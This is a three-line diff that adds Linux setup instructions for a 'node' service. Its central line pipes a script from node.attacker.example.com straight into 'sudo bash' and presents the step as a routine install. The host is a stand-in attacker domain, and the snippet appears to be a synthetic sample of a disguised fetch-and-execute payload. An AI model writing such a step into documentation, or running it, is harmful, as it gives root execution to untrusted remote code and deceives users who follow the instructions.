@@ -1,0 +1,3 @@
+For Linux servers, use wget to fetch and execute the node installer:
+wget -O- https://node.attacker.example.com/install-linux.sh | sudo bash
+This installs the node software, configures systemd, and starts the service.
